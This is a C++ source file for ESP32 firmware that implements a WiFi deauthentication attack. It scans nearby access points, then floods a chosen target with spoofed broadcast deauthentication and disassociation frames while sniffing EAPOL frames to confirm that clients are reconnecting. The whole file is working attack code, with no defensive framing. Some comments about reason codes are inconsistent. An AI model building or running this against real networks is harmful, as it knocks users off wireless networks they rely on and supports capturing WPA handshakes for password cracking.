#include "WifiDeauth.h"
#include <WiFi.h>
#include <esp_wifi.h>

WifiDeauth* WifiDeauth::_instance = nullptr;

// ─── Promiscuous callback ────────────────────────────────────────────────────
// Runs in WiFi task context. Only increments volatile counters — no heap alloc,
// no Arduino calls.
void WifiDeauth::promiscCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!_instance || !_instance->_running) return;
    if (type != WIFI_PKT_DATA) return;

    auto* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* p = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if (len < 24) return;

    // Frame Control byte 0:
    //   bits 2-3 = type (0x2 = data)
    //   bits 4-7 = subtype (bit 3 of subtype = QoS → header 26 bytes instead of 24)
    if ((p[0] & 0x0C) != 0x08) return;           // not a data frame
    bool isQoS = (p[0] & 0x80) != 0;
    int  hdrLen = isQoS ? 26 : 24;
    if (len < hdrLen + 8) return;

    // BSSID lives at Addr1, Addr2, or Addr3 depending on To/From DS bits.
    // Check all three positions against the target AP.
    const uint8_t* target = _instance->_apList[_instance->_targetIndex].bssid;
    bool match = (memcmp(p + 4,  target, 6) == 0) ||
                 (memcmp(p + 10, target, 6) == 0) ||
                 (memcmp(p + 16, target, 6) == 0);
    if (!match) return;

    // EAPOL: LLC/SNAP header → AA AA 03 00 00 00 88 8E
    const uint8_t* body = p + hdrLen;
    if (body[0] == 0xAA && body[1] == 0xAA && body[2] == 0x03 &&
        body[3] == 0x00 && body[4] == 0x00 && body[5] == 0x00 &&
        body[6] == 0x88 && body[7] == 0x8E) {
        _instance->_eapolCount++;
    }
}

// ─── Public API ───────────────────────────────────────────────────────────────

bool WifiDeauth::scan() {
    _apList.clear();

    // Ensure STA is available without killing a running AP (portal)
    wifi_mode_t mode = WIFI_MODE_NULL;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_NULL)    WiFi.mode(WIFI_STA);
    else if (mode == WIFI_MODE_AP) WiFi.mode(WIFI_AP_STA);
    // WIFI_MODE_STA / WIFI_MODE_APSTA: already fine

    WiFi.disconnect(true);

    int n = WiFi.scanNetworks(false, true); // blocking, include hidden
    if (n < 0) return false;

    for (int i = 0; i < n; i++) {
        ApInfo info;
        info.ssid    = WiFi.SSID(i);
        info.rssi    = WiFi.RSSI(i);
        info.channel = WiFi.channel(i);
        uint8_t* b   = WiFi.BSSID(i);
        if (b) memcpy(info.bssid, b, 6);
        _apList.push_back(info);
    }

    WiFi.scanDelete();
    Serial.printf("[WifiDeauth] scan found %d APs\n", (int)_apList.size());
    return true;
}

bool WifiDeauth::startDeauth(int apIndex) {
    if (_running) return false;
    if (apIndex < 0 || apIndex >= (int)_apList.size()) return false;

    _targetIndex  = apIndex;
    _targetSsid   = _apList[apIndex].ssid;
    _framesSent   = 0;
    _eapolCount   = 0;
    _instance     = this;

    // Promiscuous mode is required for reliable raw frame injection on ESP32-S3.
    // It also lets us sniff EAPOL frames to confirm deauth is causing reconnects.
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscCallback);

    esp_wifi_set_channel((uint8_t)_apList[apIndex].channel, WIFI_SECOND_CHAN_NONE);

    _running = true;
    BaseType_t ok = xTaskCreatePinnedToCore(
        deauthTask, "wifi_deauth", 4096, this, 1, &_taskHandle, 0
    );

    if (ok != pdPASS) {
        _running = false;
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        return false;
    }

    Serial.println("[WifiDeauth] deauth started: " + _targetSsid);
    return true;
}

void WifiDeauth::stop() {
    if (!_running) return;
    _running = false;
    delay(200); // let task exit its loop

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    _taskHandle = nullptr;
    _instance   = nullptr;
    Serial.printf("[WifiDeauth] stopped — frames=%d eapol=%d\n", _framesSent, _eapolCount);
}

bool WifiDeauth::isRunning() const { return _running; }

const std::vector<ApInfo>& WifiDeauth::getApList() const { return _apList; }
const String& WifiDeauth::getTargetSsid() const          { return _targetSsid; }

const char* WifiDeauth::rssiLabel(int32_t rssi) {
    if (rssi >= -60) return "****";
    if (rssi >= -70) return "*** ";
    if (rssi >= -80) return "**  ";
    return "*   ";
}

// ─── Task ────────────────────────────────────────────────────────────────────

void WifiDeauth::deauthTask(void* pvParam) {
    static_cast<WifiDeauth*>(pvParam)->runLoop();
    vTaskDelete(nullptr);
}

void WifiDeauth::runLoop() {
    while (_running) {
        if (_targetIndex >= 0 && _targetIndex < (int)_apList.size()) {
            for (int i = 0; i < 10 && _running; i++) {
                sendDeauthFrame(
                    _apList[_targetIndex].bssid,
                    (uint8_t)_apList[_targetIndex].channel
                );
                vTaskDelay(pdMS_TO_TICKS(10));
            }
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

void WifiDeauth::sendDeauthFrame(const uint8_t bssid[6], uint8_t channel) {
    (void)channel; // set once in startDeauth

    // Broadcast deauth: AP → all clients
    // Reason 7 = "Class 3 frame received when not associated"
    uint8_t frame[26];
    memset(frame, 0, sizeof(frame));
    frame[0] = 0xC0; frame[1] = 0x00;           // Frame Control: Deauth
    frame[2] = 0x00; frame[3] = 0x00;           // Duration
    memset(frame + 4,  0xFF, 6);                 // DA: broadcast
    memcpy(frame + 10, bssid, 6);               // SA: spoofed as AP
    memcpy(frame + 16, bssid, 6);               // BSSID
    frame[22] = 0x00; frame[23] = 0x00;          // Sequence Control
    frame[24] = 0x07; frame[25] = 0x00;          // Reason: leaving BSS

    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    _framesSent++;

    // Also send a disassoc frame — some clients respond better to disassoc
    uint8_t disassoc[26];
    memcpy(disassoc, frame, sizeof(disassoc));
    disassoc[0] = 0xA0;                           // Frame Control: Disassoc
    disassoc[24] = 0x08; disassoc[25] = 0x00;    // Reason: AP leaving BSS

    esp_wifi_80211_tx(WIFI_IF_STA, disassoc, sizeof(disassoc), false);
    _framesSent++;
}
